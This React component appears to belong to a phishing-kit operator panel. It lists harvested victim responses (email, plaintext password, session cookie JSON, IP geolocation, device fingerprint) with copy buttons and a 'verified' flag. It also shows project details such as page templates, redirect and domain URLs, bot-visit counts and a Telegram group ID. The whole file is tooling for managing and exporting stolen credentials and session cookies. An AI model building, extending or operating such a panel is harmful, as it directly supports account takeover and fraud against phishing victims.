import React from'react';
import { useState, useMemo } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import {
  faCopy, 
  faChevronRight,
  faCog
} from '@fortawesome/free-solid-svg-icons';
import ProjectSettingsModal from './ProjectSettingsModal';

// Define a type for the response structure
type ResponseData = {
  id: string;
  category: string;
  type: string;
  title: string;
  userId: string;
  projectId: string;
  formId: string;
  timestamp: string;
  email: string;
  domain: string;
  password: string;
  ipData: {
    ip: string;
    country: string;
    region: string;
    city: string;
    latitude: number;
    longitude: number;
    timezone: string;
    lastLogin: string;
  };
  deviceData?: {
    userAgent: string;
    browser?: string;
    browserVersion?: string;
    os?: string;
    platform?: string;
    screenResolution?: string;
    language?: string;
    device?: string;
  };
  cookieJSON?: string;
  cookieFileURL: string;
  verified: boolean;
};

interface ResponseModalProps {
  selectedProject: {
    id: string;
    formId: string;
    projectId: string;
    projectType: string;
    projectTitle: string;
    templateNiche: string;
    templateTitle: string;
    templateType: string;
    pageHealth: string;
    redirectId?: string;
    redirectURL?: string;
    redirectHealth?: string;
    domainId?: string;
    domainURL?: string;
    domainHealth?: string;
    pageVisits: number;
    botVisits: number;
    flaggedVisits: number;
    expiryDate: string;
    response: string;
    email?: string;
    telegramGroupId?: string;
    responseCount: number;
    responses: any[];
    templateVariables: string;
    systemStatus: string;
    pageURL?: string;
    templateId: string;
    links?: any[];
  } | null;
  onClose: () => void;
}

export default function ResponseModal({ selectedProject, onClose }: ResponseModalProps) {
  const [showSettingsModal, setShowSettingsModal] = useState(false);

  // Parse responses, handling potential parsing errors
  const parsedResponses: ResponseData[] = useMemo(() => {
    if (!selectedProject) return []; // Return empty array if no project selected
    return selectedProject.responses.map(responseStr => {
      try {
        // Remove extra escaping and parse
        const cleanedResponseStr = responseStr
          .replace(/\\(?=")/g, '')
          .replace(/^"/, '')
          .replace(/"$/, '');
        return JSON.parse(cleanedResponseStr);
      } catch (error) {
        console.error('Error parsing response:', error, responseStr);
        return null;
      }
    }).filter(response => response !== null) as ResponseData[];
  }, [selectedProject]); // Add selectedProject to dependencies

  // State for detailed view
  const [detailedResponseIndex, setDetailedResponseIndex] = useState<number | null>(null);

  if (!selectedProject) return null;

  // Copy to clipboard function
  const copyToClipboard = (text: string, successMessage: string = 'Copied to clipboard') => {
    navigator.clipboard.writeText(text)
      .then(() => {
        alert(successMessage);
      })
      .catch(err => {
        console.error('Failed to copy:', err);
        alert('Failed to copy');
      });
  };

  // Helper function to safely render JSON-like objects
  const renderJsonValue = (value: any): React.ReactNode => {
    if (value === null) return 'null';
    if (typeof value === 'undefined') return 'undefined';
    if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') return String(value);
    
    if (Array.isArray(value)) {
      return (
        <ul className="list-disc pl-5">
          {value.map((item, index) => (
            <li key={index}>{renderJsonValue(item)}</li>
          ))}
        </ul>
      );
    }
    
    if (typeof value === 'object') {
      return (
        <ul className="pl-5">
          {Object.entries(value).map(([key, val]) => (
            <li key={key} className="mb-1">
              <span className="font-semibold">{key}:</span> {renderJsonValue(val)}
            </li>
          ))}
        </ul>
      );
    }
    
    return String(value);
  };

  // Render detailed view for a specific response
  const renderDetailedView = (response: ResponseData) => {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 dark:bg-opacity-75">
        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-xl font-bold text-gray-900 dark:text-white">Response Details</h2>
            <button 
              onClick={() => setDetailedResponseIndex(null)} 
              className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200"
            >
              Back to List
            </button>
          </div>

          <div className="space-y-4">
            <div className="grid md:grid-cols-2 gap-4">
              <div>
                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Basic Information</h3>
                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded space-y-2">
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Email:</span>
                    <span className="ml-2 dark:text-gray-200">{response.email}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Password:</span>
                    <span className="ml-2 dark:text-gray-200">{response.password}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Domain:</span>
                    <span className="ml-2 dark:text-gray-200">{response.domain}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Timestamp:</span>
                    <span className="ml-2 dark:text-gray-200">{new Date(response.timestamp).toLocaleString()}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Verified:</span>
                    <span className={`ml-2 ${response.verified ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}`}>
                      {response.verified ? 'Yes' : 'No'}
                    </span>
                  </div>
                </div>
              </div>

              <div>
                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Project Information</h3>
                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded space-y-2">
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Category:</span>
                    <span className="ml-2 dark:text-gray-200">{response.category}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Type:</span>
                    <span className="ml-2 dark:text-gray-200">{response.type}</span>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600 dark:text-gray-300">Title:</span>
                    <span className="ml-2 dark:text-gray-200">{response.title}</span>
                  </div>
                </div>
              </div>
            </div>

            <div>
              <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">IP Data</h3>
              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded grid md:grid-cols-2 gap-2">
                {Object.entries(response.ipData).map(([key, value]) => (
                  <div key={key}>
                    <span className="font-medium text-gray-600 dark:text-gray-300 capitalize">{key}:</span>
                    <span className="ml-2 dark:text-gray-200">{String(value)}</span>
                  </div>
                ))}
              </div>
            </div>

            {response.deviceData && (
              <div>
                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Device Data</h3>
                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded grid md:grid-cols-2 gap-2">
                  {Object.entries(response.deviceData).map(([key, value]) => (
                    <div key={key}>
                      <span className="font-medium text-gray-600 dark:text-gray-300 capitalize">{key}:</span>
                      <span className="ml-2 dark:text-gray-200">{String(value)}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {response.cookieJSON && (
              <div>
                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Cookie JSON</h3>
                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded overflow-auto">
                  <pre className="text-xs dark:text-gray-200">{JSON.stringify(response.cookieJSON, null, 2)}</pre>
                  <div className="mt-2 flex justify-end">
                    <FontAwesomeIcon 
                      icon={faCopy} 
                      onClick={() => copyToClipboard(JSON.stringify(response.cookieJSON), 'Cookie JSON copied')} 
                      className="cursor-pointer hover:text-blue-500 dark:hover:text-blue-300" 
                      title="Copy Cookie JSON" 
                    />
                  </div>
                </div>
              </div>
            )}


          </div>
        </div>
      </div>
    );
  };

  // If a specific response is selected for detailed view
  if (detailedResponseIndex !== null && parsedResponses[detailedResponseIndex]) {
    return renderDetailedView(parsedResponses[detailedResponseIndex]);
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 dark:bg-opacity-75">
      {/* Project Settings Modal */}
      {showSettingsModal && selectedProject && (
        <ProjectSettingsModal
          project={selectedProject}
          onClose={() => setShowSettingsModal(false)}
        />
      )}
      <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
        <div className="bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-900 dark:to-blue-800 p-4 rounded-lg mb-4 shadow-sm dark:shadow-none">
          <div className="flex justify-between items-center mb-2">
            <div>
              <h2 className="text-2xl font-bold text-gray-800 dark:text-white flex items-center">
                {selectedProject.projectTitle}
              </h2>
              <p className="text-sm text-gray-600 dark:text-gray-300">{selectedProject.templateNiche} - {selectedProject.templateType}</p>
              {/* URLs Section */}
              <div className="flex flex-wrap gap-4 mt-2">
                {selectedProject.pageURL && (
                  <span className="flex items-center text-xs bg-blue-50 dark:bg-blue-900 px-2 py-1 rounded dark:text-blue-200">
                    <span className="font-semibold mr-1">Page URL:</span>
                    <span className="mr-1 truncate max-w-[160px]" title={selectedProject.pageURL}>{selectedProject.pageURL}</span>
                    <FontAwesomeIcon
                      icon={faCopy}
                      onClick={() => copyToClipboard(selectedProject.pageURL || '', 'Page URL copied')}
                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-blue-600 dark:hover:text-blue-300"
                      title="Copy Page URL"
                    />
                  </span>
                )}
                {selectedProject.domainURL && (
                  <span className="flex items-center text-xs bg-green-50 dark:bg-green-900 px-2 py-1 rounded dark:text-green-200">
                    <span className="font-semibold mr-1">Domain URL:</span>
                    <span className="mr-1 truncate max-w-[160px]" title={selectedProject.domainURL}>{selectedProject.domainURL}</span>
                    <FontAwesomeIcon
                      icon={faCopy}
                      onClick={() => copyToClipboard(selectedProject.domainURL || '', 'Domain URL copied')}
                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-green-600 dark:hover:text-green-300"
                      title="Copy Domain URL"
                    />
                  </span>
                )}
                {selectedProject.redirectURL && (
                  <span className="flex items-center text-xs bg-yellow-50 dark:bg-yellow-900 px-2 py-1 rounded dark:text-yellow-200">
                    <span className="font-semibold mr-1">Redirect URL:</span>
                    <span className="mr-1 truncate max-w-[160px]" title={selectedProject.redirectURL}>{selectedProject.redirectURL}</span>
                    <FontAwesomeIcon
                      icon={faCopy}
                      onClick={() => copyToClipboard(selectedProject.redirectURL || '', 'Redirect URL copied')}
                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-yellow-600 dark:hover:text-yellow-300"
                      title="Copy Redirect URL"
                    />
                  </span>
                )}
              </div>
            </div>
            <div className="flex items-center space-x-2">
              <button
                className="text-gray-500 dark:text-gray-400 hover:text-blue-600 dark:hover:text-blue-300 bg-white dark:bg-gray-700 rounded-full p-2 shadow-sm dark:shadow-none"
                title="Settings"
                onClick={() => setShowSettingsModal(true)}
              >
                <FontAwesomeIcon icon={faCog} />
              </button>
              <button 
                onClick={onClose} 
                className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 bg-white dark:bg-gray-700 rounded-full p-2 shadow-sm dark:shadow-none"
              >
                Close
              </button>
            </div>
          </div>
          <div className="mt-2 grid grid-cols-2 md:grid-cols-4 gap-2 text-sm">
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">Page Health:</span> 
              <span className={`
                ${selectedProject.pageHealth === 'healthy' ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}
              `}>
                {selectedProject.pageHealth}
              </span>
            </div>
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">Page Visits:</span> <span className="dark:text-gray-200">{selectedProject.pageVisits}</span>
            </div>
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">Bot Visits:</span> <span className="dark:text-gray-200">{selectedProject.botVisits}</span>
            </div>
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">Expiry Date:</span> <span className="dark:text-gray-200">{new Date(selectedProject.expiryDate).toLocaleDateString()}</span>
            </div>
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">Total Responses:</span> <span className="dark:text-gray-200">{selectedProject.responseCount}</span>
            </div>
            <div>
              <span className="font-semibold text-gray-700 dark:text-gray-300">System Status:</span> 
              <span className={`
                ${selectedProject.systemStatus === 'active' ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}
              `}>
                {selectedProject.systemStatus}
              </span>
            </div>
          </div>
        </div>
        <div className="text-sm text-gray-600 dark:text-gray-300 mb-4 px-4">
          Showing {parsedResponses.length} responses
        </div>

        {/* Desktop View */}
        <div className="hidden md:block">
          <table className="w-full">
            <thead>
              <tr className="bg-gray-100 dark:bg-gray-700">
                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Email</th>
                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Password</th>
                <th className="p-2 text-left text-gray-900 dark:text-gray-200">IP</th>
                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Actions</th>
              </tr>
            </thead>
            <tbody>
              {parsedResponses.map((response, index) => (
                <tr 
                  key={index} 
                  className={`border-b dark:border-gray-700 cursor-pointer ${response.verified ? 'bg-green-50 hover:bg-green-100 dark:bg-green-900 dark:hover:bg-green-800' : 'bg-red-50 hover:bg-red-100 dark:bg-red-900 dark:hover:bg-red-800'}`}
                  onClick={() => setDetailedResponseIndex(index)}
                >
                  <td className="p-2 text-gray-900 dark:text-gray-200">{response.email}</td>
                  <td className="p-2 text-gray-900 dark:text-gray-200">{response.password}</td>
                  <td className="p-2 text-gray-900 dark:text-gray-200">
                    <div>
                      <span>{response.ipData.ip}</span>
                      <p className="text-xs text-gray-500 dark:text-gray-400">{response.ipData.city}, {response.ipData.country}</p>
                    </div>
                  </td>
                  <td className="p-2 flex space-x-2">
                    <FontAwesomeIcon 
                      icon={faCopy} 
                      onClick={(e) => {
                        e.stopPropagation();
                        copyToClipboard(JSON.stringify(response.ipData), 'IP Data copied');
                      }} 
                      className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-blue-500 dark:hover:text-blue-300" 
                      title="Copy IP Data" 
                    />
                    <FontAwesomeIcon 
                      icon={faCopy} 
                      onClick={(e) => {
                        e.stopPropagation();
                        copyToClipboard(JSON.stringify(response.deviceData || {}), 'Device Data copied');
                      }} 
                      className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-green-500 dark:hover:text-green-300" 
                      title="Copy Device Data" 
                    />
                    {response.cookieJSON && (
                      <FontAwesomeIcon 
                        icon={faCopy} 
                        onClick={(e) => {
                          e.stopPropagation();
                          response.cookieJSON && copyToClipboard(response.cookieJSON, 'Cookie JSON copied');
                        }} 
                        className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-purple-500 dark:hover:text-purple-300" 
                        title="Copy Cookie JSON" 
                      />
                    )}
                    <FontAwesomeIcon 
                      icon={faChevronRight} 
                      className="text-gray-500 dark:text-gray-400" 
                    />
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>

        {/* Mobile View */}
        <div className="md:hidden">
          {parsedResponses.slice(0, 5).map((response, index) => (
            <div 
              key={index} 
              className={`rounded-lg p-3 mb-2 ${response.verified ? 'bg-green-100 dark:bg-green-900' : 'bg-red-100 dark:bg-red-900'}`}
              onClick={() => setDetailedResponseIndex(index)}
            >
              <div className="flex justify-between items-center mb-2">
                <div>
                  <p className="font-bold text-gray-900 dark:text-white">Email: {response.email}</p>
                  <p className="text-sm text-gray-600 dark:text-gray-300">Password: {response.password}</p>
                </div>
                <FontAwesomeIcon icon={faChevronRight} className="text-blue-500 dark:text-blue-400" />
              </div>
              <div className="flex justify-between items-center">
                <div>
                  <p className="text-sm text-gray-900 dark:text-gray-200">IP: {response.ipData.ip}</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400">{response.ipData.city}, {response.ipData.country}</p>
                </div>
                <div className="flex items-center space-x-2">
                  <FontAwesomeIcon 
                    icon={faCopy} 
                    onClick={(e) => {
                      e.stopPropagation();
                      copyToClipboard(JSON.stringify(response.ipData), 'IP Data copied');
                    }} 
                    className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-blue-500 dark:hover:text-blue-300" 
                    title="Copy IP Data" 
                  />
                </div>
              </div>
            </div>
          ))}
          {parsedResponses.length > 5 && (
            <div className="text-center text-gray-500 dark:text-gray-400 mt-2">
              {parsedResponses.length - 5} more responses
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
